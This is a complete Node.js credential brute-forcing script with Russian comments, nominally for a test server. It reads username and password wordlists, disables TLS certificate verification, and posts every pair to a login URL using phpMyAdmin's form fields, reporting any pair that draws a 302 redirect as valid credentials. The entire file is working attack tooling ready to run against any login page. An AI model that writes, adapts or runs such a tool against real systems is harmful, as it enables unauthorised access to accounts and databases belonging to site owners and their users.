// Brute Force Tool for Test Node.js Server
// Dependencies: npm install axios fs readline-sync

const axios = require('axios');
const fs = require('fs');
const readline = require('readline-sync');
const https = require('https');

// ?? Отключение проверки SSL (только для тестового сервера)
const agent = new https.Agent({
    rejectUnauthorized: false,
});

// ?? Получение данных от пользователя
const targetUrl = readline.question("Enter login URL (e.g., https://localhost:8443/login): ");
const usernameFile = readline.question("Path to usernames file (e.g., usernames.txt): ");
const passwordFile = readline.question("Path to passwords file (e.g., passwords.txt): ");

// ?? Функция чтения строк из файла
function readFileLines(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            console.error(`[ERROR] File not found: ${filePath}`);
            process.exit(1);
        }

        const data = fs.readFileSync(filePath, 'utf-8');
        const lines = data.split('\n').map(line => line.trim()).filter(Boolean);

        if (lines.length === 0) {
            console.error(`[ERROR] File is empty or contains only whitespace: ${filePath}`);
            process.exit(1);
        }

        return lines;
    } catch (err) {
        console.error(`[ERROR] Failed to read file: ${err.message}`);
        process.exit(1);
    }
}

// ?? Загрузка логинов и паролей
const usernames = readFileLines(usernameFile);
const passwords = readFileLines(passwordFile);

console.log(`[INFO] Loaded ${usernames.length} usernames and ${passwords.length} passwords`);

// ? Задержка между попытками
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ?? Массив для хранения найденных учетных записей
const validCredentials = [];

// ?? Основная функция брутфорса
async function bruteForce() {
    console.log(`[INFO] Starting brute force attack with ${usernames.length} usernames and ${passwords.length} passwords\n`);

    for (const username of usernames) {
        for (const password of passwords) {
            try {
                console.log(`[-] Trying: ${username}:${password}`);

                // ?? Отправка POST-запроса
                const response = await axios.post(targetUrl, new URLSearchParams({
                    pma_username: username,
                    pma_password: password,
                    server: '1'
                }).toString(), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    httpsAgent: agent,
                    maxRedirects: 0,
                    validateStatus: () => true
                });

                // ?? Отладочная информация
                console.log(`Status code: ${response.status}`);
                console.log(`Response snippet: ${response.data.substring(0, 300)}...`);

                // ? Проверка успешного входа (по статусу 302)
                if (response.status === 302) {
                    console.log(`\n[SUCCESS] Valid credentials found: ${username}:${password}`);
                    validCredentials.push({ username, password });
                }

                await delay(1000); // Задержка между попытками

            } catch (error) {
                console.log(`[ERROR] ${error.message}`);
                await delay(1000);
            }
        }
    }

    // ?? Вывод всех найденных учетных записей
    if (validCredentials.length > 0) {
        console.log(`\n? Found ${validCredentials.length} valid credential(s):`);
        validCredentials.forEach((cred, index) => {
            console.log(`  ${index + 1}. ${cred.username}:${cred.password}`);
        });
    } else {
        console.log("\n[!] Attack completed: No valid credentials found");
    }

    readline.question("Press Enter to exit...");
}

// ?? Запуск атаки
bruteForce();